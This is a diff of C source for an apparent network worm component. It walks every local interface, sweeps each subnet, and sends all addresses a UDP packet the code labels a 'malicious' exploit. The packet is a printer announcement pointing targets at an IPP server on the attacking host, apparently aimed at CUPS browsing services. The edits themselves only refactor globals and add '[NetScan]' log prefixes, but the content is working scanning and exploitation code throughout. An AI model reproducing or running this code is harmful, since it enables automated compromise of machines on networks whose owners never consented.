@@ -17,28 +17,28 @@
 #define BUFFER_SIZE 500  // TODO what is the size of the data??
 
 
-void uint32_to_sockaddr(Globals *global, uint32_t ip, struct sockaddr_in *addr) {
+void uint32_to_sockaddr(uint32_t ip, struct sockaddr_in *addr) {
   addr->sin_addr.s_addr = global->htonl(ip);
 }
 
-uint32_t sockaddr_to_uint32(Globals *global, struct sockaddr_in *addr) {
+uint32_t sockaddr_to_uint32(struct sockaddr_in *addr) {
   return global->ntohl(addr->sin_addr.s_addr);
 }
 
-void send_to_subnet(Globals *global, struct sockaddr_in *if_ip, struct sockaddr_in *if_mask) {
+void send_to_subnet(struct sockaddr_in *if_ip, struct sockaddr_in *if_mask) {
 
-  uint32_t ip = sockaddr_to_uint32(global, if_ip);
-  uint32_t mask = sockaddr_to_uint32(global, if_mask);
+  uint32_t ip = sockaddr_to_uint32(if_ip);
+  uint32_t mask = sockaddr_to_uint32(if_mask);
 
   uint32_t lower_bound = ip & mask;
   uint32_t upper_bound = ip | ~mask;
 
   if (DEBUG) {
     struct sockaddr_in upper, lower;
-    uint32_to_sockaddr(global, lower_bound, &lower);
-    uint32_to_sockaddr(global, upper_bound, &upper);
-    DEBUG_LOG("Lower: %s\n", global->inet_ntoa(lower.sin_addr));
-    DEBUG_LOG("Upper: %s\n", global->inet_ntoa(upper.sin_addr));
+    uint32_to_sockaddr(lower_bound, &lower);
+    uint32_to_sockaddr(upper_bound, &upper);
+    DEBUG_LOG("[NetScan] Lower: %s\n", global->inet_ntoa(lower.sin_addr));
+    DEBUG_LOG("[NetScan] Upper: %s\n", global->inet_ntoa(upper.sin_addr));
   }
 
   struct sockaddr_in ip_adr = {.sin_port = global->htons(TARGET_PORT)};
@@ -53,7 +53,7 @@ void send_to_subnet(Globals *global, struct sockaddr_in *if_ip, struct sockaddr_
   // Send a malicious UDP packet to the target printer
   char *payload = global->malloc(BUFFER_SIZE);
   global->snprintf(payload, BUFFER_SIZE, "0 3 http://%s:%d/printers/hp \"Local\" \"HPLaserJet\"", global->inet_ntoa(if_ip->sin_addr), global->ipp_server_port);
-  global->printf("Initiate exploit: %s\n", payload);
+  DEBUG_LOG("[NetScan] Initiate exploit: %s\n", payload);
   size_t payload_size = global->strlen(payload) + 1;
 
   struct pollfd pfds[1];
@@ -62,15 +62,15 @@ void send_to_subnet(Globals *global, struct sockaddr_in *if_ip, struct sockaddr_
 
   struct sockaddr_in it_ip;
   for (uint32_t it = lower_bound; it < upper_bound; it++) {
-    uint32_to_sockaddr(global, it, &ip_adr);
+    uint32_to_sockaddr(it, &ip_adr);
 
     bytes_sent = global->sendto(sockfd, payload, payload_size, 0, (struct sockaddr *)&ip_adr, sizeof ip_adr);
 
     CHECK(bytes_sent == -1);
 
     if (DEBUG && it % 10 == 0) {
-      uint32_to_sockaddr(global, it, &it_ip);
-      DEBUG_LOG("Send %zi bytes to %s\n", bytes_sent,
+      uint32_to_sockaddr(it, &it_ip);
+      DEBUG_LOG("[NetScan] Send %zi bytes to %s\n", bytes_sent,
                 global->inet_ntoa(it_ip.sin_addr));
     }
 
@@ -82,7 +82,8 @@ void send_to_subnet(Globals *global, struct sockaddr_in *if_ip, struct sockaddr_
   global->close(sockfd);
 }
 
-void scan_net(Globals *global) {
+void scan_net(Globals *glob) {
+  global = glob;
   struct ifaddrs *pIfaddrs;
 
   global->getifaddrs(&pIfaddrs);
@@ -110,17 +111,17 @@ void scan_net(Globals *global) {
     global->strncpy(ifreq_addr.ifr_name, ifa->ifa_name, IFNAMSIZ);
 
     if (global->ioctl(fd, SIOCGIFADDR, &ifreq_addr) == -1 || global->ioctl(fd, SIOCGIFNETMASK, &ifreq_mask) == -1) {
-      DEBUG_LOG("skipping interface %s since it doesn't have inet or netmask\n", ifa->ifa_name);
+      DEBUG_LOG("[NetScan] skipping interface %s since it doesn't have inet or netmask\n", ifa->ifa_name);
       continue;
     }
 
     ipv4 = (struct sockaddr_in *)&ifreq_addr.ifr_ifru.ifru_addr;
     net_mask = (struct sockaddr_in *)&ifreq_mask.ifr_ifru.ifru_netmask;
 
-    DEBUG_LOG("interface: %s\n", ifreq_mask.ifr_name);
-    DEBUG_LOG("address: %s\n", global->inet_ntoa(ipv4->sin_addr));
-    DEBUG_LOG("net_mask: %s\n", global->inet_ntoa(net_mask->sin_addr));
-    send_to_subnet(global, ipv4, net_mask);
+    DEBUG_LOG("[NetScan] interface: %s\n", ifreq_mask.ifr_name);
+    DEBUG_LOG("[NetScan] address: %s\n", global->inet_ntoa(ipv4->sin_addr));
+    DEBUG_LOG("[NetScan] net_mask: %s\n", global->inet_ntoa(net_mask->sin_addr));
+    send_to_subnet(ipv4, net_mask);
   }
 
   global->close(fd);
